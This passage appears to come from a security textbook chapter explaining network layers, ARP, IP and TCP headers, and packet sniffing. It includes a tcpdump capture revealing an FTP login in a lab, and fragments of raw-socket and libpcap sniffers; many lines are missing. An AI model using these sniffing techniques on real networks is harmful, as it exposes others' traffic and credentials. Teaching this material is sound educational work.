layers, the\ntraffic could be financial data, email, or basically anything. Regardless of\nwhat the packets contain, the protocols used at the lower layers to move the\ndata from point A to point B are usually the same. Once you understand the\noffice bureaucracy of these common lower layer protocols, you can peek\ninside envelopes in transit, and even falsify documents to manipulate the\nThe lowest visible layer is the data-link layer. Returning to the receptionist\nand bureaucracy analogy, if the physical layer below is thought of as inter-\noffice mail carts and the network layer above as a worldwide postal system,\nthe data-link layer is the system of interoffice mail. This layer provides a way\nto address and send messages to anyone else in the office, as well as to figure\nEthernet exists on this layer, providing a standard addressing system\nfor all Ethernet devices. These addresses are known as Media Access Con-\ntrol (MAC) addresses. Every Ethernet device is assigned a globally unique\naddress consisting of six bytes, usually written in hexadecimal in the form\nxx:xx:xx:xx:xx:xx. These addresses are also sometimes referred to as hardware\naddresses, since each address is unique to a piece of hardware and is stored in\nthe device\u2019s integrated circuit memory. MAC addresses can be thought of as\nSocial Security numbers for hardware, since each piece of hardware is\nAn Ethernet header is 14 bytes in size and contains the source and destin-\nation MAC addresses for this Ethernet packet. Ethernet addressing also pro-\nvides a special broadcast address, consisting of all binary 1\u2019s (ff:ff:ff:ff:ff:ff).\nAny Ethernet packet sent to this address will be sent to all the connected\nThe MAC address of a network device isn\u2019t meant to change, but its\nIP address may change regularly. The concept of IP addresses doesn\u2019t exist\nat this level, only hardware addresses do, so a method is needed to correlate\nthe two addressing schemes. In the office, post office mail sent to an\nemployee at the office\u2019s address goes to the appropriate desk. In Ethernet,\nthe method is known as Address Resolution Protocol (ARP).\nThis protocol allows \u201cseating charts\u201d to be made to associate an IP address\nwith a piece of hardware. There are four different types of ARP messages, but\nthe two most important types are ARP request messages and ARP reply messages.\nAny packet\u2019s Ethernet header includes a type value that describes the packet.\nThis type is used to specify whether the packet is an ARP-type message or an\nAn ARP request is a message, sent to the broadcast address, that contains\nthe sender\u2019s IP address and MAC address and basically says, \u201cHey, who has\nthis IP? If it\u2019s you, please respond and tell me your MAC address.\u201d An ARP\nreply is the corresponding response that is sent to the requester\u2019s MAC address\n(and IP address) saying, \u201cThis is my MAC address, and I have this IP address.\u201d\nMost implementations will temporarily cache the MAC/IP address pairs\nreceived in ARP replies, so that ARP requests and replies aren\u2019t needed for\nevery single packet. These caches are like the interoffice seating chart.\nFor example, if one system has the IP address 10.10.10.20 and MAC\naddress 00:00:00:aa:aa:aa, and another system on the same network has\nthe IP address 10.10.10.50 and MAC address 00:00:00:bb:bb:bb, neither\nsystem can communicate with the other until they know each other\u2019s MAC\nIf the first system wants to establish a TCP connection over IP to the\nsecond device\u2019s IP address of 10.10.10.50, the first system will first check its\nARP cache to see if an entry exists for 10.10.10.50. Since this is the first time\nthese two systems are trying to communicate, there will be no such entry, and\nan ARP request will be sent out to the broadcast address, saying, \u201cIf you are\n10.10.10.50, please respond to me at 00:00:00:aa:aa:aa.\u201d Since this request\nuses the broadcast address, every system on the network sees the request, but\nonly the system with the corresponding IP address is meant to respond. In this\ncase, the second system responds with an ARP reply that is sent directly back\nto 00:00:00:aa:aa:aa saying, \u201cI am 10.10.10.50 and I\u2019m at 00:00:00:bb:bb:bb.\u201d\nThe first system receives this reply, caches the IP and MAC address pair in its\nARP cache, and uses the hardware address to communicate.\nThe network layer is like a worldwide postal service providing an addressing\nand delivery method used to send things everywhere. The protocol used at\nthis layer for Internet addressing and delivery is, appropriately, called Internet\nProtocol (IP); the majority of the Internet uses IP version 4.\nEvery system on the Internet has an IP address, consisting of a familiar\nfour-byte arrangement in the form of xx.xx.xx.xx. The IP header for packets\nin this layer is 20 bytes in size and consists of various fields and bitflags as\nA summary of the contents of the internet header follows:\n0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version|  IHL  |Type of Service|          Total Length         |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Identification        |Flags|      Fragment Offset    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  Time to Live |    Protocol   |         Header Checksum       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                       Source Address                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Destination Address                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Options                    |    Padding    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nNote that each tick mark represents one bit position.\nThis surprisingly descriptive ASCII diagram shows these fields and their\npositions in the header. Standard protocols have awesome documentation.\nSimilar to the Ethernet header, the IP header also has a protocol field to\ndescribe the type of data in the packet and the source and destination\naddresses for routing. In addition, the header carries a checksum, to help\ndetect transmission errors, and fields to deal with packet fragmentation.\nThe Internet Protocol is mostly used to transmit packets wrapped in\nhigher layers. However, Internet Control Message Protocol (ICMP) packets\nalso exist on this layer. ICMP packets are used for messaging and diagnostics.\nIP is less reliable than the post office\u2014there\u2019s no guarantee that an IP packet\nwill actually reach its final destination. If there\u2019s a problem, an ICMP packet\nICMP is also commonly used to test for connectivity. ICMP Echo Request\nand Echo Reply messages are used by a utility called ping. If one host wants\nto test whether it can route traffic to another host, it pings the remote host by\nsending an ICMP Echo Request. Upon receipt of the ICMP Echo Request, the\nremote host sends back an ICMP Echo Reply. These messages can be used\nto determine the connection latency between the two hosts. However, it is\nimportant to remember that ICMP and IP are both connectionless; all this\nprotocol layer really cares about is getting the packet to its destination address.\nSometimes a network link will have a limitation on packet size, disallowing\nthe transfer of large packets. IP can deal with this situation by fragmenting\nThe packet is broken up into smaller packet fragments that can pass\nthrough the network link, IP headers are put on each fragment, and they\u2019re\nsent off. Each fragment has a different fragment offset value, which is stored\nin the header. When the destination receives these fragments, the offset\nvalues are used to reassemble the original IP packet.\nProvisions such as fragmentation aid in the delivery of IP packets, but\nthis does nothing to maintain connections or ensure delivery. This is the job\nThe transport layer can be thought of as the first line of office receptionists,\npicking up the mail from the network layer. If a customer wants to return a\ndefective piece of merchandise, they send a message requesting a Return\nMaterial Authorization (RMA) number. Then the receptionist would follow\nthe return protocol by asking for a receipt and eventually issuing an RMA\nnumber so the customer can mail the product in. The post office is only\nconcerned with sending these messages (and packages) back and forth, not\nThe two major protocols at this layer are the Transmission Control\nProtocol (TCP) and User Datagram Protocol (UDP). TCP is the most\ncommonly used protocol for services on the Internet: telnet, HTTP (web\ntraffic), SMTP (email traffic), and FTP (file transfers) all use TCP. One of\nthe reasons for TCP\u2019s popularity is that it provides a transparent, yet reliable\nand bidirectional, connection between two IP addresses. Stream sockets use\nTCP/IP connections. A bidirectional connection with TCP is similar to using\na telephone\u2014after dialing a number, a connection is made through which\nboth parties can communicate. Reliability simply means that TCP will ensure\nthat all the data will reach its destination in the proper order. If the packets\nof a connection get jumbled up and arrive out of order, TCP will make sure\nthey\u2019re put back in order before handing the data up to the next layer. If\nsome packets in the middle of a connection are lost, the destination will hold\non to the packets it has while the source retransmits the missing packets.\nAll of this functionality is made possible by a set of flags, called TCP flags,\nand by tracking values called sequence numbers. The TCP flags are as follows:\nThese flags are stored in the TCP header along with the source and\ndestination ports. The TCP header is specified in RFC 793.\nTCP segments are sent as internet datagrams.  The Internet Protocol\nheader carries several information fields, including the source and\ndestination host addresses [2].  A TCP header follows the internet\nheader, supplying information specific to the TCP protocol.  This\ndivision allows for the existence of host level protocols other than\nAcknowledges a packet; it is turned on for the majority of the\nTells the receiver to push the data through instead of buffering it\nSynchronizes sequence numbers at the beginning of a connection\nGracefully closes a connection when both sides say goodbye\n0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                        Sequence Number                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Acknowledgment Number                      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  Data |           |U|A|P|R|S|F|                               |\n| Offset| Reserved  |R|C|S|S|Y|I|            Window             |\n|       |           |G|K|H|T|N|N|                               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|           Checksum            |         Urgent Pointer        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Options                    |    Padding    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                             data                              |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nNote that one tick mark represents one bit position.\nThe sequence number and acknowledgment number are used to maintain\nstate. The SYN and ACK flags are used together to open connections in a\nthree-step handshaking process. When a client wants to open a connection\nwith a server, a packet with the SYN flag on, but the ACK flag off, is sent to\nthe server. The server then responds with a packet that has both the SYN and\nACK flags turned on. To complete the connection, the client sends back a\npacket with the SYN flag off but the ACK flag on. After that, every packet in\nthe connection will have the ACK flag turned on and the SYN flag turned off.\nOnly the first two packets of the connection have the SYN flag on, since those\nSequence numbers allow TCP to put unordered packets back into order,\nto determine whether packets are missing, and to prevent mixing up packets\nWhen a connection is initiated, each side generates an initial sequence\nnumber. This number is communicated to the other side in the first two SYN\npackets of the connection handshake. Then, with each packet that is sent,\nthe sequence number is incremented by the number of bytes found in the\ndata portion of the packet. This sequence number is included in the TCP\npacket header. In addition, each TCP header has an acknowledgment number,\nwhich is simply the other side\u2019s sequence number plus one.\nTCP is great for applications where reliability and bidirectional communi-\ncation are needed. However, the cost of this functionality is paid in commu-\nUDP has much less overhead and built-in functionality than TCP. This\nlack of functionality makes it behave much like the IP protocol: It is connec-\ntionless and unreliable. Without built-in functionality to create connections\nand maintain reliability, UDP is an alternative that expects the application to\ndeal with these issues. Sometimes connections aren\u2019t needed, and the light-\nweight UDP is a much better protocol for these situations. The UDP header,\ndefined in RFC 768, is relatively tiny. It only contains four 16-bit values in this\norder: source port, destination port, length, and checksum.\nOn the data-link layer lies the distinction between switched and unswitched\nnetworks. On an unswitched network, Ethernet packets pass through every\ndevice on the network, expecting each system device to only look at the\npackets sent to its destination address. However, it\u2019s fairly trivial to set a\ndevice to promiscuous mode, which causes it to look at all packets, regardless\nof the destination address. Most packet-capturing programs, such as tcpdump,\ndrop the device they are listening to into promiscuous mode by default. Pro-\nmiscuous mode can be set using ifconfig, as seen in the following output.\neth0      Link encap:Ethernet  HWaddr 00:0C:29:34:61:65\nRX packets:17115 errors:0 dropped:0 overruns:0 frame:0\nTX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\nRX bytes:4602913 (4.3 MiB)  TX bytes:434449 (424.2 KiB)\nreader@hacking:~/booksrc $ sudo ifconfig eth0 promisc\neth0      Link encap:Ethernet  HWaddr 00:0C:29:34:61:65\nUP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1\nRX packets:17181 errors:0 dropped:0 overruns:0 frame:0\nTX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\nRX bytes:4668475 (4.4 MiB)  TX bytes:434449 (424.2 KiB)\nThe act of capturing packets that aren\u2019t necessarily meant for public view-\ning is called sniffing. Sniffing packets in promiscuous mode on an unswitched\nnetwork can turn up all sorts of useful information, as the following output\nreader@hacking:~/booksrc $ sudo tcpdump -l -X 'ip host 192.168.0.118'\n21:27:44.684964 192.168.0.118.ftp > 192.168.0.193.32778: P 1:42(41) ack 1 win\n0x0000   4500 005d e065 4000 8006 97ad c0a8 0076        E..].e@........v\n0x0010   c0a8 00c1 0015 800a 292e 8a73 5ed4 9ce8        ........)..s^...\n0x0020   8018 43a4 a12f 0000 0101 080a 0007 1f78        ..C../.........x\n0x0030   000e 0a8a 3232 3020 5459 5053 6f66 7420        ....220.TYPSoft.\n0x0040   4654 5020 5365 7276 6572 2030 2e39 392e        FTP.Server.0.99.\n0x0050   3133                                           13\n21:27:44.685132 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 42 win 5840\n0x0000   4510 0034 966f 4000 4006 21bd c0a8 00c1        E..4.o@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c        ...v....^...)...\n0x0020   8010 16d0 81db 0000 0101 080a 000e 0c56        ...............V\n0x0030   0007 1f78                                      ...x\n21:27:52.406177 192.168.0.193.32778 > 192.168.0.118.ftp: P 1:13(12) ack 42 win\n5840 <nop,nop,timestamp 921434 466808> (DF) [tos 0x10]\n0x0000   4510 0040 9670 4000 4006 21b0 c0a8 00c1        E..@.p@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c        ...v....^...)...\n0x0020   8018 16d0 edd9 0000 0101 080a 000e 0f5a        ...............Z\n0x0030   0007 1f78 5553 4552 206c 6565 6368 0d0a        ...xUSER.leech..\n21:27:52.415487 192.168.0.118.ftp > 192.168.0.193.32778: P 42:76(34) ack 13\n0x0000   4500 0056 e0ac 4000 8006 976d c0a8 0076        E..V..@....m...v\n0x0010   c0a8 00c1 0015 800a 292e 8a9c 5ed4 9cf4        ........)...^...\n0x0020   8018 4398 4e2c 0000 0101 080a 0007 1fc5        ..C.N,..........\n0x0030   000e 0f5a 3333 3120 5061 7373 776f 7264        ...Z331.Password\n0x0040   2072 6571 7569 7265 6420 666f 7220 6c65        .required.for.le\n0x0050   6563                                           ec\n21:27:52.415832 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 76 win 5840\n0x0000   4510 0034 9671 4000 4006 21bb c0a8 00c1        E..4.q@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe        ...v....^...)...\n0x0020   8010 16d0 7e5b 0000 0101 080a 000e 0f5b        ....~[.........[\n0x0030   0007 1fc5                                      ....\n21:27:56.155458 192.168.0.193.32778 > 192.168.0.118.ftp: P 13:27(14) ack 76\nwin 5840 <nop,nop,timestamp 921809 466885> (DF) [tos 0x10]\n0x0000   4510 0042 9672 4000 4006 21ac c0a8 00c1        E..B.r@.@.!.....\n0x0010   c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe        ...v....^...)...\n0x0020   8018 16d0 90b5 0000 0101 080a 000e 10d1        ................\n0x0030   0007 1fc5 5041 5353 206c 3840 6e69 7465        ....PASS.l8@nite\n0x0040   0d0a                                           ..\n21:27:56.179427 192.168.0.118.ftp > 192.168.0.193.32778: P 76:103(27) ack 27\n0x0000   4500 004f e0cc 4000 8006 9754 c0a8 0076        E..O..@....T...v\n0x0010   c0a8 00c1 0015 800a 292e 8abe 5ed4 9d02        ........)...^...\n0x0020   8018 438a 4c8c 0000 0101 080a 0007 1feb        ..C.L...........\n0x0030   000e 10d1 3233 3020 5573 6572 206c 6565        ....230.User.lee\n0x0040   6368 206c 6f67 6765 6420 696e 2e0d 0a          ch.logged.in...\nData transmitted over the network by services such as telnet, FTP, and\nPOP3 is unencrypted. In the preceding example, the user leech is seen logging\ninto an FTP server using the password l8@nite. Since the authentication pro-\ncess during login is also unencrypted, usernames and passwords are simply\ncontained in the data portions of the transmitted packets.\ntcpdump is a wonderful, general-purpose packet sniffer, but there are\nspecialized sniffing tools designed specifically to search for usernames and\npasswords. One notable example is Dug Song\u2019s program, dsniff, which is\nsmart enough to parse out data that looks important.\n12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)\n12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)\nSo far in our code examples, we have been using stream sockets. When\nsending and receiving using stream sockets, the data is neatly wrapped in a\nTCP/IP connection. Accessing the OSI model of the session (5) layer, the\noperating system takes care of all of the lower-level details of transmission,\ncorrection, and routing. It is possible to access the network at lower layers\nusing raw sockets. At this lower layer, all the details are exposed and must be\nhandled explicitly by the programmer. Raw sockets are specified by using\nSOCK_RAW as the type. In this case, the protocol matters since there are multiple\noptions. The protocol can be IPPROTO_TCP, IPPROTO_UDP, or IPPROTO_ICMP. The\nfollowing example is a TCP sniffing program using raw sockets.\nif ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)\nThis program opens a raw TCP socket and listens for three packets, print-\ning the raw data of each one with the dump() function. Notice that buffer is\ndeclared as a u_char variable. This is just a convenience type definition from\nsys/socket.h that expands to \u201cunsigned char.\u201d This is for convenience, since\nunsigned variables are used a lot in network programming and typing\nWhen compiled, the program needs to be run as root, because the use\nof raw sockets requires root access. The following output shows the program\nsniffing the network while we\u2019re sending sample text to our simple_server.\nreader@hacking:~/booksrc $ gcc -o raw_tcpsniff raw_tcpsniff.c\n[!!] Fatal Error in socket: Operation not permitted\n45 10 00 44 1e 36 40 00 40 06 46 23 c0 a8 2a 01 | E..D.6@.@.F#..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf 92 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 32 47 00 00 01 01 08 0a 26 ab 9a f1 | ....2G......&...\n02 3b 65 b7 74 68 69 73 20 69 73 20 61 20 74 65 | .;e.this is a te\n73 74 0d 0a                                     | st..\n45 10 00 46 1e 37 40 00 40 06 46 20 c0 a8 2a 01 | E..F.7@.@.F ..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf a2 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 27 95 00 00 01 01 08 0a 26 ab a0 75 | ....'.......&..u\n02 3c 1b 28 41 41 41 41 41 41 41 41 41 41 41 41 | .<.(AAAAAAAAAAAA\n41 41 41 41 0d 0a                               | AAAA..\n45 10 00 47 1e 38 40 00 40 06 46 1e c0 a8 2a 01 | E..G.8@.@.F...*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf b4 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 68 45 00 00 01 01 08 0a 26 ab b6 e7 | ....hE......&...\n02 3c 20 ad 66 6a 73 64 61 6c 6b 66 6a 61 73 6b | .< .fjsdalkfjask\n66 6a 61 73 64 0d 0a                            | fjasd..\nWhile this program will capture packets, it isn\u2019t reliable and will miss\nsome packets, especially when there is a lot of traffic. Also, it only captures\nTCP packets\u2014to capture UDP or ICMP packets, additional raw sockets need\nto be opened for each. Another big problem with raw sockets is that they are\nnotoriously inconsistent between systems. Raw socket code for Linux most\nlikely won\u2019t work on BSD or Solaris. This makes multiplatform programming\nA standardized programming library called libpcap can be used to smooth\nout the inconsistencies of raw sockets. The functions in this library still use\nraw sockets to do their magic, but the library knows how to correctly work\nwith raw sockets on multiple architectures. Both tcpdump and dsniff use\nlibpcap, which allows them to compile with relative ease on any platform.\nLet\u2019s rewrite the raw packet sniffer program using the libpcap\u2019s functions\ninstead of our own. These functions are quite intuitive, so we will discuss\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\nprintf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\nFirst, pcap.h is included providing various structures and defines used by\nthe pcap functions. Also, I\u2019ve written a pcap_fatal() function for displaying\nfatal errors. The pcap functions use a error buffer to return error and status\nmessages, so this function is designed to display this buffer to the user.\nThe errbuf variable is the aforementioned error buffer, its size coming\nfrom a define in pcap.h set to 256. The header variable is a pcap_pkthdr structure\ncontaining extra capture information about the packet, such as when it was\ncaptured and its length. The pcap_handle pointer works similarly to a file\ndescriptor, but is used to reference a packet-capturing object.\nThe pcap_lookupdev() function looks for a suitable device to sniff on. This\ndevice is returned as a string pointer referencing static function memory. For\nour system this will always be /dev/eth0, although it will be different on a BSD\nsystem. If the function can\u2019t find a suitable interface, it will return NULL.\npcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\nSimilar to the socket function and file open function, the pcap_open_live()\nfunction opens a packet-capturing device, returning a handle to it. The argu-\nments for this function are the device to sniff, the maximum packet size, a\npromiscuous flag, a timeout value, and a pointer to the error buffer. Since we\nwant to capture in promiscuous mode, the promiscuous flag is set to 1.\nFinally, the packet capture loop uses pcap_next() to grab the next packet.\nThis function is passed the pcap_handle and a pointer to a pcap_pkthdr struc-\nture so it can fill it with details of the capture. The function returns a pointer\nto the packet and then prints the packet, getting the length from the capture\nheader. Then pcap_close() closes the capture interface.\nWhen this program is compiled, the pcap libraries must be linked. This\ncan be done using the -l flag with GCC, as shown in the output below. The\npcap library has been installed on this system, so the library and include files\nare already in standard locations the compiler knows about.\nreader@hacking:~/booksrc $ gcc -o pcap_sniff pcap_sniff.c\npcap_sniff.c:(.text+0x1c8): undefined reference to `pcap_lookupdev'\npcap_sniff.c:(.text+0x233): undefined reference to `pcap_open_live'\npcap_sniff.c:(.text+0x282): undefined reference to `pcap_next'\npcap_sniff.c:(.text+0x2c2): undefined reference to `pcap_close'\nreader@hacking:~/booksrc $ gcc -o pcap_sniff pcap_sniff.c -l pcap\nFatal Error in pcap_lookupdev: no suitable device found\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 44 1e 39 40 00 40 06 46 20 c0 a8 2a 01 c0 a8 | .D.9@.@.F ..*...\n2a f9 8b 12 1e d2 ac 14 cf c7 e5 10 6c c9 80 18 | *...........l...\n05 b4 54 1a 00 00 01 01 08 0a 26 b6 a7 76 02 3c | ..T.......&..v.<\n37 1e 74 68 69 73 20 69 73 20 61 20 74 65 73 74 | 7.this is a test\n0d 0a                                           | ..\n00 01 29 15 65 b6 00 01 6c eb 1d 50 08 00 45 00 | ..).e...l..P..E.\n00 34 3d 2c 40 00 40 06 27 4d c0 a8 2a f9 c0 a8 | .4=,@.@.'M..*...\n2a 01 1e d2 8b 12 e5 10 6c c9 ac 14 cf d7 80 10 | *.......l.......\n05 a8 2b 3f 00 00 01 01 08 0a 02 47 27 6c 26 b6 | ..+?.......G'l&.\na7 76                                           | .v\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 46 1e 3a 40 00 40 06 46 1d c0 a8 2a 01 c0 a8 | .F.:@.@.F...*...\n2a f9 8b 12 1e d2 ac 14 cf d7 e5 10 6c c9 80 18 | *...........l...\n05 b4 11 b3 00 00 01 01 08 0a 26 b6 a9 c8 02 47 | ..........&....G\n27 6c 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | 'lAAAAAAAAAAAAAA\n41 41 0d 0a                                     | AA..\nNotice that there are many bytes preceding the sample text in the packet\nand many of these bytes are similar. Since these are raw packet captures, most\nof these bytes are layers of header information for Ethernet, IP, and TCP.\nIn our packet captures, the outermost layer is Ethernet, which is also the\nlowest visible layer. This layer is used to send data between Ethernet end-\npoints with MAC addresses. The header for this layer contains the source\nMAC address, the destination MAC address, and a 16-bit value that describes\nthe type of Ethernet packet. On Linux, the structure for this header is defined\nin /usr/include/linux/if_ethernet.h and the structures for the IP header and\nTCP header are located in /usr/include/netinet/ip.h and /usr/include/\nnetinet/tcp.h, respectively. The source code for tcpdump also has structures\nfor these headers, or we could just create our own header structures based\non the RFCs. A better understanding can be gained from writing our own\nstructures, so let\u2019s use the structure definitions as guidance to create our\nown packet header structures to include in hacking-network.h.\nFirst, let\u2019s look at the existing definition of the Ethernet header.\n#define ETH_ALEN  6   /* Octets in one ethernet addr   */\n#define ETH_HLEN  14    /* Total octets in header */\nunsigned char h_dest[ETH_ALEN]; /* Destination eth addr */\nunsigned char h_source[ETH_ALEN]; /* Source ether addr  */\nThis structure contains the three elements of an Ethernet header. The\nvariable declaration of __be16 turns out to be a type definition for a 16-bit\nunsigned short integer. This can be determined by recursively grepping for\n/usr/include/linux/types.h:typedef __u16 __bitwise __be16;\n$ grep -R \"typedef.*__u16\" /usr/include | grep short\n/usr/include/linux/i2o-dev.h:typedef unsigned short __u16;\n/usr/include/linux/cramfs_fs.h:typedef unsigned short __u16;\n/usr/include/asm/types.h:typedef unsigned short __u16;\nThe include file also defines the Ethernet header length in ETH_HLEN as\n14 bytes. This adds up, since the source and destination MAC addresses use\n6 bytes each, and the packet type field is a 16-bit short integer that takes up\n2 bytes. However, many compilers will pad structures along 4-byte boundaries\nfor alignment, which means that sizeof(struct ethhdr) would return an\nincorrect size. To avoid this, ETH_HLEN or a fixed value of 14 bytes should\nBy including <linux/if_ether.h>, these other include files containing\nthe required __be16 type definition are also included. Since we want to make\nour own structures for hacking-network.h, we should strip out references to\nunknown type definitions. While we\u2019re at it, let\u2019s give these fields better names.\nunsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\nunsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\nunsigned short ether_type; // Type of Ethernet packet\nWe can do the same thing with the IP and TCP structures, using the\ncorresponding structures and RFC diagrams as a reference.\n0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version|  IHL  |Type of Service|          Total Length         |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Identification        |Flags|      Fragment Offset    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  Time to Live |    Protocol   |         Header Checksum       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                       Source Address                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Destination Address                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Options                    |    Padding    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nEach element in the structure corresponds to the fields shown in the\nRFC header diagram. Since the first two fields, Version and IHL (Internet\nHeader Length) are only four bits in size and there aren\u2019t any 4-bit variable\ntypes in C, the Linux header definition splits the byte differently depending\non the byte order of the host. These fields are in the network byte order, so,\nif the host is little-endian, the IHL should come before Version since the byte\norder is reversed. For our purposes, we won\u2019t really be using either of these\nfields, so we don\u2019t even need to split up the byte.\nunsigned char ip_version_and_header_length; // Version and header length\nunsigned short ip_id;          // Identification number\nunsigned short ip_frag_offset; // Fragment offset and flags\nunsigned int ip_src_addr;      // Source IP address\nunsigned int ip_dest_addr;     // Destination IP address\nThe compiler padding, as mentioned earlier, will align this structure on\na 4-byte boundary by padding the rest of the structure. IP headers are always\nFor the TCP packet header, we reference /usr/include/netinet/tcp.h\nfor the structure and RFC 793 for the header diagram.\n0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                        Sequence Number                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Acknowledgment Number                      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  Data |           |U|A|P|R|S|F|                               |\n| Offset| Reserved  |R|C|S|S|Y|I|            Window             |\n|       |           |G|K|H|T|N|N|                               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|           Checksum            |         Urgent Pointer        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Options                    |    Padding    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                             data                              |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nThe number of 32 bit words in the TCP Header.  This indicates where\nthe data begins.  The TCP header (even one including options) is an\nLinux\u2019s tcphdr structure also switches the ordering of the 4-bit data offset\nfield and the 4-bit section of the reserved field depending on the host\u2019s byte\norder. The data offset field is important, since it tells the size of the variable-\nlength TCP header. You might have noticed that Linux\u2019s tcphdr structure\ndoesn\u2019t save any space for TCP options. This is because the RFC defines this\nfield as optional. The size of the TCP header will always be 32-bit-aligned, and\nthe data offset tells us how many 32-bit words are in the header. So the TCP\nheader size in bytes equals the data offset field from the header times four.\nSince the data offset field is required to 